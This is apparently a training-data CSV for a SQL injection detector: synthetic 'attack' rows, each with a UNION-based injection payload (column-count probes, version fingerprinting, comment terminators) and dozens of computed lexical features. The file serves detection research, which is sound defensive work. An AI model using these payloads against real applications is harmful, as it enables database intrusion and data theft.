id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000561,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000086,1.273870441265712,63.0,21.0,3.711353951630928,14.000000000000002,21.25684565391712,16.74315434608288,11.0,0.2222222222222222,0.33741024847487494,0.2657643546997282,0.1746031746031746,0.6857885865207195,0.3142114134792805,3.0,0.0,0.0,0.0,0.0,2.6857885865207196,1.0,0.0,3.3142114134792804,3.0,0.6857885865207195,0.31421141347928044,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000562,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.43261869463939917,76.0,26.0,3.8560341686060027,40.81389211797421,2.813892117974211,23.813892117974213,8.558323646077367,0.5370248962891344,0.03702489628913433,0.31334068576281854,0.11260952165891272,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.372215764051578,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000563,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,1.2489265614245895,59.00676638248525,19.80135327649705,3.801671281517009,14.000000000000002,29.6027065529941,5.602706552994101,9.801353276497052,0.23885462115949832,0.5023662662112135,0.09290120136635932,0.1658779112629288,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.4006766382485255,0.0,0.0,5.400676638248526,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.4006766382485255,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000564,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000002,0.5725676528896056,79.68662283187848,32.39788005895022,4.176411055090862,40.0,2.457748554585651,23.686622831878474,13.54225144541435,0.5020893928256964,0.03068676908745127,0.2970748500440251,0.17014898804282724,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.228874277292825,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000565,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.0731163645283321,76.97067783299472,26.97067783299473,3.9276958762720446,40.02932216700527,3.970677832994731,23.02932216700527,9.94135566598946,0.5200667623956965,0.051582276453967096,0.2992023610219629,0.1291486001283734,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.970677832994731,0.0,0.0,1.0,0.9706778329947304,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000566,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,1.3931926378462611,73.87561098307506,21.886474724195466,3.6848741045386766,42.545898896781864,9.0,14.0,8.329712086293199,0.5750938760032647,0.12248541687542105,0.19053287069509947,0.11188783642621473,0.443237362097733,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.886474724195466,1.0,0.44323736209773296,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000567,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,1.1237142678487928,70.34544717951897,22.32727641024052,3.7209142485845983,14.000000000000002,30.61821128192414,14.727235897594822,11.0,0.19905363124856795,0.43605235353951477,0.2084947335166138,0.1563992816953034,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.3454471795189646,0.0,0.0,5.654552820481035,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000568,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.055229280348327726,77.0,26.07932671347192,3.887052416941356,40.0,4.920673286528077,23.0,9.079326713471923,0.5194805194805194,0.063904847876988,0.2987012987012987,0.11791333394119381,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000569,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000107,0.6360111848440664,77.7694502634412,16.7949083772402,3.184039524067712,45.179633508960805,1.0,18.0,13.589816754480402,0.5808559623876552,0.012871605641851691,0.23168890155333072,0.1745835304171623,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.7949083772402015,0.0,6.794908377240201,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000570,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,0.4101685574799802,74.44812446017833,22.0,3.778947888720737,14.000000000000002,39.10375107964332,9.344373380535021,12.0,0.18807365888291308,0.5255605621419759,0.12515978564689986,0.16120599332821123,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.2240622300891704,0.0,0.0,7.775937769910829,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000571,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.2782504488740947,62.7892354626825,14.46487257711375,3.0126898705091554,47.859490308455,1.0,4.0,9.9297451542275,0.762440552329269,0.015962314277100348,0.06384925710840152,0.15774787628522915,0.4648725771137503,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.46487257711375,2.0,0.46487257711375024,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000572,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.3244123419683847,73.71325490086691,32.286745099133086,4.379910882449182,43.42650980173382,2.6433725495665445,17.0,10.643372549566545,0.5888910519982025,0.0359500331352981,0.2306620395772169,0.1444968752892825,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000573,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000093,0.4759117166230707,56.71889918436162,21.312527124429387,3.7282862253061615,21.500216995435085,14.90615506449715,14.0,6.312527124429385,0.37433962816695837,0.2667592676577293,0.2479160912999827,0.11098501287532961,1.0,0.0,2.8437364377853074,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.4687906866440783,3.8437364377853074,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000574,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,0.7361987709638006,65.72391490356974,16.80543464974502,3.226684030069591,40.33478420305977,1.0,14.0,10.389130700509963,0.6121588617722358,0.015311499710663867,0.2143609959492937,0.1581686425678067,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.805434649745019,0.0,5.583696050764943,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000575,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000044,0.8497213217995447,55.70480454916928,16.704804549169282,3.288696198965554,38.0,1.0,8.0,8.70480454916928,0.682213450367392,0.017952985535983984,0.14362388428787198,0.156209679808752,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.7048045491692798,0.0,5.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000576,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,1.9150102636347628,73.19428061192798,23.513877186566283,3.8136606649070135,26.777965014939458,22.87468403728966,14.0,9.541631559698851,0.3798382328728267,0.29753420851397083,0.1930454680744334,0.129582090538769,0.0,1.0,2.513877186566284,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.027754373132568,3.513877186566284,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000577,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.2815806016630461,77.90250960416026,16.0,3.0847982328067585,50.0,1.0,14.722007683328203,12.18050192083205,0.6422037566981291,0.012844075133962574,0.18862202362338107,0.1563301445445272,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1805019208320506,0.0,0.0,8.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000578,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.17501007542260894,69.92850313708699,21.185700627417397,3.5344984833910704,14.000000000000002,40.742802509669595,4.0,11.185700627417399,0.20035271368601296,0.5824741965694717,0.05724363248171799,0.1599294572627974,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.185700627417399,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000579,attack,union," select * from users where id  =  1 union select @ _,version  (    )   -- 1",nearest_attack_euclidean,R000020,1.5560001958298093,75.17448415208405,26.0,3.832490086732288,40.174484152084055,2.174484152084055,24.0,8.825515847915945,0.5344047272496389,0.028901288263532637,0.3192653298859619,0.11742865460086656,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.8255158479159453,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000580,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000015,0.3118448653006739,79.99121487934002,26.330404959780005,3.8643168497738847,40.0,3.3304049597800063,25.330404959780005,11.330404959780005,0.5002086145147266,0.041544974866409456,0.3166597128495091,0.14158669776935476,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.330404959780005,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000581,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.12090694880998072,61.24871676190474,16.0,3.2158906214744216,41.857876136054436,1.0,8.35530965986391,10.035530965986391,0.6839161861859502,0.016333481976397113,0.1358929978679992,0.16385733396965343,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0710619319727819,0.0,0.0,5.964469034013609,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000582,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,1.1221877807626253,60.18571669295308,25.395238897651026,4.036799926145342,27.419044409395898,11.766672283557178,16.0,5.0,0.4566259803331653,0.19424882845634112,0.26600014568418556,0.08312504552630798,0.6047611023489746,0.0,2.3952388976510255,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.3952388976510255,0.6047611023489746,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000583,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,0.4087039626965837,80.79034058999547,23.100804950833712,3.8464429467659444,24.395170294997733,32.0,15.395170294997733,9.0,0.3015061758606145,0.3969876482787709,0.18985339978221022,0.11165277607840432,0.1008049508337111,0.0,3.0,0.0,0.0,1.0,0.0,0.8991950491662888,0.0,0.0,4.0,4.0,0.1008049508337111,0.0,1.0,0.0,0.0,1.0,0.899195049166289,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000584,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,1.5976570647380837,60.487355162844324,21.21941225840985,3.6381225280515928,14.000000000000002,30.4388245168197,6.4388245168196985,9.609706129204925,0.2327207465114146,0.503548126098137,0.10459827493571197,0.15913285245473635,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6097061292049247,0.39029387079507527,0.0,5.609706129204925,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.6097061292049247,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000585,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,0.7012977408090799,67.39754289625711,22.0,3.7497701453361136,14.000000000000002,33.13251429875237,9.698771448128555,10.566257149376185,0.20897088804531258,0.4925492480345239,0.1417641919223213,0.15671567199784225,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.2831285746880927,0.0,0.0,6.283128574688093,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000586,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.15981617576591012,69.869803877082,19.0,3.6550009745775682,14.000000000000002,40.6958431016656,4.0,11.1739607754164,0.20051365956146733,0.5822994553332641,0.057289617017562106,0.15989726808770655,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.1739607754164,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000587,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000073,0.6987390030709609,58.687754629488786,20.36877546294888,3.5614801642068876,14.000000000000002,30.95020370359103,4.0,9.737550925897757,0.2401038979544495,0.5255955451949148,0.06860111370127128,0.16569944314936436,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.737550925897757,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000588,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000082,1.8555670729655114,57.12238969625679,17.0,3.3022859162015217,35.755220607486415,1.0,11.367169088770375,9.0,0.6267369290521803,0.017511579527014542,0.19814727567767446,0.15760421574313083,0.4388051518716044,0.5611948481283956,0.0,0.0,0.0,0.0,0.0,1.5611948481283957,1.0,0.0,4.4388051518716045,0.0,0.43880515187160435,0.5611948481283956,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000589,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,0.722965892959502,62.992496280539214,15.751875929865198,3.1150751604463482,46.992496280539214,1.0,4.0,11.0,0.7458162122406226,0.015886486734961097,0.06354594693984437,0.174751354084572,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.7518759298651974,0.0,7.248124070134803,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000590,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,1.0654872483447655,68.20908212970592,21.641816425941183,3.5617215109571436,14.000000000000002,37.13453140752948,5.43273429623526,11.641816425941185,0.20551051652398178,0.5430887721623795,0.08075935653135045,0.1706413547822883,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.3581835740588152,1.0,0.0,7.28363285188237,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.3581835740588153,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000591,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,1.1459765065763399,70.67849731972188,15.330375670069529,3.1230475537538567,43.35699463944377,1.0,15.321502680278115,11.0,0.6124372421022762,0.014158803652017604,0.21765711407351263,0.15574684017219348,0.0,0.33037567006952856,2.0,0.0,0.0,0.0,0.0,2.330375670069529,0.0,0.0,6.339248659860942,2.0,0.0,0.3303756700695286,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000592,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,0.024837614597584996,74.08831328862844,20.98738381591022,3.502622370687349,14.000000000000002,40.0,8.075697104538666,12.012616184089778,0.18898291857844537,0.5399511959384156,0.10892477134248145,0.1621411141406577,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0126161840897778,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000593,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.8572449748314942,71.27717748324996,15.722822516750043,3.1089284356347484,48.89129006700017,1.0,9.663064899499751,11.72282251675004,0.6861155556718532,0.014030286094825928,0.13534041236277047,0.16451374587055037,0.7228225167500414,0.0,2.0,0.0,0.0,0.0,0.0,1.2771774832499587,0.0,0.0,7.722822516750042,2.0,0.7228225167500414,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
